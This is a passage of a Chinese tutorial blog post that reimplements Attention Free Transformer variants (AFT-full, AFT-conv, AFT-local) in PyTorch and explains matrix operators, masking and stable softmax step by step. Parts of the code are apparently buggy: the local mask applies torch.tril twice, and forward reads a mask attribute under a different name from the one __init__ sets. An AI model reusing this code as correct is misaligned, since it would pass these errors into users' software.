class="line"></span><br><span class="line">        y = torch.sigmoid(q) * (torch.softmax(k, dim=<span class="number">1</span>) * v).<span class="built_in">sum</span>(dim=<span class="number">1</span>, keepdim=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.out(y).view(B, H, W, C)</span><br></pre></td></tr></table></figure><hr><h1 id="2-AFT-full"><a href="#2-AFT-full" class="headerlink" title="2 AFT-full"></a>2 AFT-full</h1><h2 id="2-1-2个问题"><a href="#2-1-2个问题" class="headerlink" title="2.1 2个问题"></a>2.1 2个问题</h2><p>在复现代码的过程中发现了2个问题：</p><ol><li>矩阵运算中@和 * 有什么区别？</li><li>a@b和b@a有什么区别？</li></ol><h3 id="2-1-1-2个问题"><a href="#2-1-1-2个问题" class="headerlink" title="2.1.1 2个问题"></a>2.1.1 2个问题</h3><p>用<code>numpy</code>的<code>np.array()</code>定义矩阵A，B，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">A = np.array([ [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">               [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>] ])</span><br><span class="line"> </span><br><span class="line">B = np.array([ [<span class="number">6</span>, <span class="number">5</span>],</span><br><span class="line">               [<span class="number">4</span>, <span class="number">3</span>],</span><br><span class="line">               [<span class="number">2</span>, <span class="number">1</span>] ])</span><br></pre></td></tr></table></figure><h4 id="2-1-1-1-运算"><a href="#2-1-1-1-运算" class="headerlink" title="2.1.1.1 * 运算"></a>2.1.1.1 * 运算</h4><p>“*”运算是将两个向量中每个元素进行相乘，是数乘运算，需要两个矩阵维度相同，所以需要A的转置与B做“*”运算，就是论文中的element-wise运算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(A.T*B)</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[[ 6 20]</span></span><br><span class="line"><span class="string"> [ 8 15]</span></span><br><span class="line"><span class="string"> [ 6  6]]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="2-1-1-2-运算"><a href="#2-1-1-2-运算" class="headerlink" title="2.1.1.2 @运算"></a>2.1.1.2 @运算</h4><p>“@”运算都可以起到矩阵乘法的作用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(A @ B)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[[20 14]</span></span><br><span class="line"><span class="string"> [56 41]]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><hr><h1 id="3-AFT-conv"><a href="#3-AFT-conv" class="headerlink" title="3 AFT-conv"></a>3 AFT-conv</h1><p>我的理解是在每个头中同时使用卷积运算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AFT_Conv</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, dim, hidden_dim=<span class="number">64</span>, head_num=<span class="number">4</span>, kernel_size=<span class="number">7</span>, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.head_num = head_num</span><br><span class="line">        <span class="variable language_">self</span>.hidden_dim = hidden_dim</span><br><span class="line">        <span class="variable language_">self</span>.head_dim = hidden_dim // head_num</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.w_q = nn.Linear(dim, hidden_dim)</span><br><span class="line">        <span class="variable language_">self</span>.w_v = nn.Linear(dim, hidden_dim)</span><br><span class="line">        <span class="variable language_">self</span>.w_k = nn.Linear(dim, hidden_dim)</span><br><span class="line">        <span class="variable language_">self</span>.kernels = [</span><br><span class="line">            nn.Parameter(torch.Tensor(<span class="variable language_">self</span>.head_dim, <span class="variable language_">self</span>.head_dim, kernel_size, kernel_size), requires_grad=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(head_num)</span><br><span class="line">        ]</span><br><span class="line">        <span class="variable language_">self</span>.conv2d = nn.ModuleList([</span><br><span class="line">            nn.Conv2d(in_channels=<span class="variable language_">self</span>.head_dim, out_channels=<span class="variable language_">self</span>.head_dim, kernel_size=kernel_size, padding=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(head_num)</span><br><span class="line">        ])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(head_num):</span><br><span class="line">            <span class="variable language_">self</span>.conv2d[i].weight.data = torch.exp(<span class="variable language_">self</span>.kernels[i]) - <span class="number">1</span></span><br><span class="line">        <span class="variable language_">self</span>.out = nn.Linear(hidden_dim, dim)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">attention</span>(<span class="params">self, q, k, v, conv</span>):</span><br><span class="line">        max_k = k.<span class="built_in">max</span>(dim=<span class="number">0</span>, keepdims=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">        exp_k = torch.exp(k - max_k)</span><br><span class="line"></span><br><span class="line">        num = conv(exp_k * v) + exp_k.<span class="built_in">sum</span>(dim=<span class="number">1</span>, keepdim=<span class="literal">True</span>) * v</span><br><span class="line">        den = conv(exp_k) + exp_k.<span class="built_in">sum</span>(dim=<span class="number">1</span>, keepdim=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        y = torch.sigmoid(q) * num / den</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        B, H, W, C = x.shape</span><br><span class="line">        <span class="keyword">assert</span> C % <span class="variable language_">self</span>.head_num == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        q = <span class="variable language_">self</span>.w_q(x).view(B, <span class="variable language_">self</span>.head_num, -<span class="number">1</span>, H, W)</span><br><span class="line">        v = <span class="variable language_">self</span>.w_v(x).view(B, <span class="variable language_">self</span>.head_num, -<span class="number">1</span>, H, W)</span><br><span class="line">        k = <span class="variable language_">self</span>.w_k(x).view(B, <span class="variable language_">self</span>.head_num, -<span class="number">1</span>, H, W)</span><br><span class="line"></span><br><span class="line">        q_s = [q[:, i, :<span class="variable language_">self</span>.hidden_dim // <span class="variable language_">self</span>.head_num, :, :].contiguous() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.head_num)]</span><br><span class="line">        k_s = [k[:, i, :<span class="variable language_">self</span>.hidden_dim // <span class="variable language_">self</span>.head_num, :, :].contiguous() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.head_num)]</span><br><span class="line">        v_s = [v[:, i, :<span class="variable language_">self</span>.hidden_dim // <span class="variable language_">self</span>.head_num, :, :].contiguous() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.head_num)]</span><br><span class="line"></span><br><span class="line">        attentions = [<span class="variable language_">self</span>.attention(q_, k_, v_, conv) <span class="keyword">for</span> conv, q_, k_, v_ <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="variable language_">self</span>.conv2d, q_s, k_s, v_s)]</span><br><span class="line"></span><br><span class="line">        y = torch.cat(attentions, dim=<span class="number">1</span>).view(B, H, W, -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.out(y)</span><br></pre></td></tr></table></figure><hr><h1 id="4-AFT-local"><a href="#4-AFT-local" class="headerlink" title="4 AFT-local"></a>4 AFT-local</h1><h2 id="4-1-代码解释"><a href="#4-1-代码解释" class="headerlink" title="4.1 代码解释"></a>4.1 代码解释</h2><h3 id="4-1-1-初始化"><a href="#4-1-1-初始化" class="headerlink" title="4.1.1 初始化"></a>4.1.1 初始化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, d_model, seq_len, local_window_size, bias</span>):</span><br><span class="line">    <span class="built_in">super</span>().__init__()</span><br><span class="line">    <span class="variable language_">self</span>.local_window_size = local_window_size</span><br><span class="line">    <span class="comment"># Q K V</span></span><br><span class="line">    <span class="variable language_">self</span>.query = nn.Linear(d_model, d_model, bias=bias)</span><br><span class="line">    <span class="variable language_">self</span>.key = nn.Linear(d_model, d_model, bias=bias)</span><br><span class="line">    <span class="variable language_">self</span>.value = nn.Linear(d_model, d_model, bias=bias)</span><br><span class="line">    <span class="comment"># 成对位置偏差</span></span><br><span class="line">    <span class="variable language_">self</span>.pos_bias = nn.Parameter(torch.zeros(seq_len, seq_len), requires_grad=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 掩码</span></span><br><span class="line">    <span class="variable language_">self</span>.w_mask = nn.Parameter(<span class="variable language_">self</span>.create_local_mask(seq_len, local_window_size), requires_grad=<span class="literal">False</span>)</span><br><span class="line">    <span class="variable language_">self</span>.activation = nn.Sigmoid()</span><br><span class="line">    <span class="variable language_">self</span>.output = nn.Linear(d_model, d_model)</span><br></pre></td></tr></table></figure><h3 id="4-1-2-创建掩码"><a href="#4-1-2-创建掩码" class="headerlink" title="4.1.2 创建掩码"></a>4.1.2 创建掩码</h3><p>#<a href="https://www.wolai.com/hNU2RbZwNzmyLoLDRMbcK3" title="torch.tril">torch.tril</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_local_mask</span>(<span class="params">seq_len, local_window_size</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    创建局部掩码</span></span><br><span class="line"><span class="string">    :param seq_len:</span></span><br><span class="line"><span class="string">    :param local_window_size:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 初始化为1</span></span><br><span class="line">    local_mask = torch.ones(seq_len, seq_len, dtype=torch.<span class="built_in">bool</span>)</span><br><span class="line">    <span class="comment"># 将 [t+s,+∞] 设置为0</span></span><br><span class="line">    local_mask = torch.tril(local_mask, local_window_size - <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 将 [-∞,t + s] 设置为0</span></span><br><span class="line">    local_mask = torch.tril(local_mask, -(local_window_size - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> local_mask</span><br></pre></td></tr></table></figure><h3 id="4-1-3-forward函数"><a href="#4-1-3-forward函数" class="headerlink" title="4.1.3 forward函数"></a>4.1.3 forward函数</h3><p><strong>输入：</strong>query、key、value、mask</p><ul><li><code>query</code>、<code>key</code>和<code>value</code>是存储查询、键和值的标记嵌入集合的张量。它们的形状为 <code>[seq_len, batch_size, d_model]</code></li><li><code>mask</code> 具有形状 <code>[seq_len, seq_len, batch_size]</code> 和 <code>mask[i, j, b]</code> 指示对于批次 <code>b</code> ，位置 <code>i</code> 处的查询是否有权访问密钥-位置 <code>j</code> 处的值</li></ul><p><strong>输出：</strong>注意力模块计算结果</p><h3 id="4-1-4-获取序列长度"><a href="#4-1-4-获取序列长度" class="headerlink" title="4.1.4 获取序列长度"></a>4.1.4 获取序列长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seq_len, _, _ = query.shape</span><br></pre></td></tr></table></figure><h3 id="4-1-5-判断是否有掩码"><a href="#4-1-5-判断是否有掩码" class="headerlink" title="4.1.5 判断是否有掩码"></a>4.1.5 判断是否有掩码</h3><p><code>mask</code> 具有形状 <code>[seq_len_q, seq_len_k, batch_size]</code> ，其中第一个维度是查询维度。如果查询维度等于 1 ，它将被广播。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">assert</span> mask.shape[<span class="number">0</span>] == <span class="number">1</span> <span class="keyword">or</span> mask.shape[<span class="number">0</span>] == query.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">assert</span> mask.shape[<span class="number">1</span>] == key.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">assert</span> mask.shape[<span class="number">2</span>] == <span class="number">1</span> <span class="keyword">or</span> mask.shape[<span class="number">2</span>] == query.shape[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3 id="4-1-6-变换query、key和value"><a href="#4-1-6-变换query、key和value" class="headerlink" title="4.1.6 变换query、key和value"></a>4.1.6 变换query、key和value</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="variable language_">self</span>.query(query)</span><br><span class="line">key = <span class="variable language_">self</span>.key(key)</span><br><span class="line">value = <span class="variable language_">self</span>.value(value)</span><br></pre></td></tr></table></figure><p>由于$W^Q$、$W^K$和$W^V$的输入和输出维度相同，因此三个变量的形状没有发生变化。</p><h3 id="4-1-7-计算成对位置偏置"><a href="#4-1-7-计算成对位置偏置" class="headerlink" title="4.1.7 计算成对位置偏置"></a>4.1.7 计算成对位置偏置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pos_bias = <span class="variable language_">self</span>.pos_bias[:seq_len, :seq_len] * <span class="variable language_">self</span>.local_mask[:seq_len, :seq_len]</span><br></pre></td></tr></table></figure><p><code>pos_bias</code>的形状为<code>[seq_len, seq_len]</code></p><ul><li><code>self.pos_bias</code>：这是一个预定义的位置偏差矩阵，它可能包含了模型中不同位置之间的某种偏差信息。这个矩阵的维度通常是根据模型能处理的最大序列长度来定义的。</li><li><code>seq_len</code>：当前处理的序列长度。由于不同的输入序列可能有不同的长度，而<code>self.pos_bias</code>是基于最大长度定义的，因此需要截取与当前序列长度相匹配的部分。</li><li><code>self.local_mask[:seq_len, :seq_len]</code>：这是一个局部掩码（local mask），用于限制位置偏差的作用范围。它可能用于实现某种形式的局部注意力机制，即只允许序列中的某些位置相互注意。这个掩码通常是一个与<code>seq_len</code>大小相同的二维矩阵，其中的元素可能是0（表示不允许）或1（表示允许）。</li><li>通过将<code>self.pos_bias</code>和<code>self.local_mask</code>的对应部分相乘，我们得到了一个调整后的位置偏差矩阵，它只保留了那些被局部掩码允许的位置偏差。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pos_bias = pos_bias.unsqueeze(-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><code>pos_bias</code>的形状为<code>[seq_len, seq_len, 1]</code></p><ul><li><code>unsqueeze(-1)</code>：这个操作是在<code>pos_bias</code>的<strong>最后一个维度上增加一个大小为1的维度</strong>。这通常是为了满足后续操作的维度要求。例如，在注意力机制中，位置偏差可能需要与其他张量（如注意力权重）进行广播（broadcasting）操作，而这些张量可能具有额外的维度。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pos_bias.masked_fill_(~mask, <span class="built_in">float</span>(<span class="string">&#x27;-inf&#x27;</span>))</span><br></pre></td></tr></table></figure><ul><li><code>mask</code>：这是一个与当前序列长度<code>seq_len</code>相关的布尔型掩码，用于指示哪些位置是有效的（通常是<code>True</code>）或无效的（<code>False</code>）。注意，这里的<code>mask</code>可能与前面提到的<code>self.local_mask</code>不同，尽管它们的作用类似，但可能具有不同的形状或逻辑。</li><li><code>~mask</code>：对<code>mask</code>取反，得到一个与原<code>mask</code>形状相同但逻辑相反的布尔型张量。在这个张量中，原<code>mask</code>中为<code>True</code>的位置现在为<code>False</code>，反之亦然。</li><li><code>masked_fill_</code>：这是一个原地（in-place）操作，它会将<code>pos_bias</code>中<code>~mask</code>为<code>True</code>（即原<code>mask</code>为<code>False</code>）的位置填充为<code>float(&#39;-inf&#39;)</code>。在注意力机制中，这通常用于屏蔽掉那些不应该被注意到的位置，因为<code>float(&#39;-inf&#39;)</code>在后续的<code>softmax</code>操作中会被转换成接近0的概率值。</li></ul><h3 id="4-1-8-稳定softmax计算"><a href="#4-1-8-稳定softmax计算" class="headerlink" title="4.1.8 稳定softmax计算"></a>4.1.8 稳定<code>softmax</code>计算</h3><p>我们在计算指数之前减去$\max <em>{t^{\prime}}\left(K</em>{t^{\prime}}\right)$和$\max <em>{t^{\prime}}\left(w</em>{t, t^{\prime}}\right)$以稳定<code>softmax</code>计算。</p><p>如果$x_i$很大，$exp(x_i)$就会变得很大，并且$\frac{\sum \exp \left(x_{i}\right) y_{i}}{\sum \exp \left(x_{i}\right)}$的计算变得不稳定。在计算分子和分母的指数之前减去一个常数将会抵消。并且可以帮助稳定计算，因此减去$\max (x_i)$来稳定计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">max_key = key.<span class="built_in">max</span>(dim=<span class="number">0</span>, keepdims=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">max_pos_bias = pos_bias.<span class="built_in">max</span>(dim=<span class="number">1</span>, keepdims=<span class="literal">True</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>计算$\exp \left(K_{t^{\prime}}-\max <em>{t^{\prime}}\left(K</em>{t^{\prime}}\right)\right)$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp_key = torch.exp(key - max_key)</span><br></pre></td></tr></table></figure><p>计算$\exp \left(w_{t, t^{\prime}}-\max <em>{t^{\prime}}\left(w</em>{t, t^{\prime}}\right)\right)$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp_pos_bias = torch.exp(pos_bias - max_pos_bias)</span><br></pre></td></tr></table></figure><h3 id="4-1-9-计算输出"><a href="#4-1-9-计算输出" class="headerlink" title="4.1.9 计算输出"></a>4.1.9 计算输出</h3><p>#<a href="https://www.wolai.com/h2oNWFSq3DjWRYCHAw3jus" title="torch.einsum">torch.einsum</a></p><p>接下来根据以下公式进行计算</p><p>$$<br>\begin{aligned} Y_{t} &amp; &#x3D;\sigma\left(Q_{t}\right) \odot \frac{\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(K_{t^{\prime}}+w_{t, t^{\prime}}\right) \odot V_{t^{\prime}}}{\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(K_{t^{\prime}}+w_{t, t^{\prime}}\right)} \ &amp; &#x3D;\sigma\left(Q_{t}\right) \odot \frac{\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(w_{t, t^{\prime}}\right) \odot \exp \left(K_{t^{\prime}}\right) \odot V_{t^{\prime}}}{\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(w_{t, t^{\prime}}\right) \odot \exp \left(K_{t^{\prime}}\right)}\end{aligned}<br>$$</p><p>分子部分$\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(w_{t, t^{\prime}}\right) \odot \exp \left(K_{t^{\prime}}\right) \odot V_{t^{\prime}}$：</p><ol><li><code>exp_pos_bias</code>的形状：<code>[seq_len, seq_len, 1]</code></li><li><code>exp_key</code>的形状：<code>[seq_len, batch_size, d_model]</code></li><li><code>value</code>的形状：<code>[seq_len, batch_size, d_model]</code></li><li><code>exp_key * value</code>的形状：<code>[seq_len, batch_size, d_model]</code></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num = torch.einsum(<span class="string">&#x27;ijb,jbd-&gt;ibd&#x27;</span>, exp_pos_bias, exp_key * value)</span><br></pre></td></tr></table></figure><p><code>num</code>的形状：<code>[seq_len, batch_size, d_model]</code></p><p>分母部分$\sum_{t^{\prime}&#x3D;1}^{T} \exp \left(w_{t, t^{\prime}}\right) \odot \exp \left(K_{t^{\prime}}\right)$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">den = torch.einsum(<span class="string">&#x27;ijb,jbd-&gt;ibd&#x27;</span>, exp_pos_bias, exp_key)</span><br></pre></td></tr></table></figure><p><code>den</code>的形状：<code>[seq_len, batch_size, d_model]</code></p><p>输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y = <span class="variable language_">self</span>.activation(query) * num / den</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>.output(y)</span><br></pre></td></tr></table></figure><p>最后输出的形状为<code>[seq_len, batch_size, d_model]</code></p><h2 id="4-2-每个变量的形状总结"><a href="#4-2-每个变量的形状总结" class="headerlink" title="4.2 每个变量的形状总结"></a>4.2 每个变量的形状总结</h2><table><thead><tr><th>变量名</th><th>形状</th></tr></thead><tbody><tr><td>输入x</td><td><code>[seq_len, batch_size, d_model]</code></td></tr><tr><td>$W^Q$</td><td><code>[d_model, d_q]</code>→<code>[d_model, d_model]</code></td></tr><tr><td>$W^K$</td><td><code>[d_model, d_k]</code>→<code>[d_model, d_model]</code></td></tr><tr><td>$W^V$</td><td><code>[d_model, d_v]</code>→<code>[d_model, d_model]</code></td></tr><tr><td>$w$</td><td><code>[seq_len, seq_len]</code></td></tr><tr><td>$w _ mask$</td><td><code>[seq_len, seq_len]</code></td></tr></tbody></table><h2 id="4-3-完整代码"><a href="#4-3-完整代码" class="headerlink" title="4.3 完整代码"></a>4.3 完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"><span class="keyword">from</span> labml_helpers.module <span class="keyword">import</span> Module</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AFTLocal</span>(<span class="title class_ inherited__">Module</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, d_model, seq_len, local_window_size, bias</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.local_window_size = local_window_size</span><br><span class="line">        <span class="comment"># Q K V</span></span><br><span class="line">        <span class="variable language_">self</span>.query = nn.Linear(d_model, d_model, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.key = nn.Linear(d_model, d_model, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.value = nn.Linear(d_model, d_model, bias=bias)</span><br><span class="line">        <span class="comment"># 成对位置偏差</span></span><br><span class="line">        <span class="variable language_">self</span>.pos_bias = nn.Parameter(torch.zeros(seq_len, seq_len), requires_grad=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># 掩码</span></span><br><span class="line">        <span class="variable language_">self</span>.w_mask = nn.Parameter(<span class="variable language_">self</span>.create_local_mask(seq_len, local_window_size), requires_grad=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.activation = nn.Sigmoid()</span><br><span class="line">        <span class="variable language_">self</span>.output = nn.Linear(d_model, d_model)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_local_mask</span>(<span class="params">seq_len, local_window_size</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        创建局部掩码</span></span><br><span class="line"><span class="string">        :param seq_len:</span></span><br><span class="line"><span class="string">        :param local_window_size:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 初始化为1</span></span><br><span class="line">        local_mask = torch.ones(seq_len, seq_len, dtype=torch.<span class="built_in">bool</span>)</span><br><span class="line">        <span class="comment"># 将 [t+s,+∞] 设置为0</span></span><br><span class="line">        local_mask = torch.tril(local_mask, local_window_size - <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 将 [-∞,t + s] 设置为0</span></span><br><span class="line">        local_mask = torch.tril(local_mask, -(local_window_size - <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> local_mask</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                query: torch.Tensor,</span></span><br><span class="line"><span class="params">                key:   torch.Tensor,</span></span><br><span class="line"><span class="params">                value: torch.Tensor,</span></span><br><span class="line"><span class="params">                mask:  <span class="type">Optional</span>[torch.Tensor] = <span class="literal">None</span></span>):</span><br><span class="line">        seq_len, _, _ = query.shape</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">assert</span> mask.shape[<span class="number">0</span>] == <span class="number">1</span> <span class="keyword">or</span> mask.shape[<span class="number">0</span>] == query.shape[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">assert</span> mask.shape[<span class="number">1</span>] == key.shape[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">assert</span> mask.shape[<span 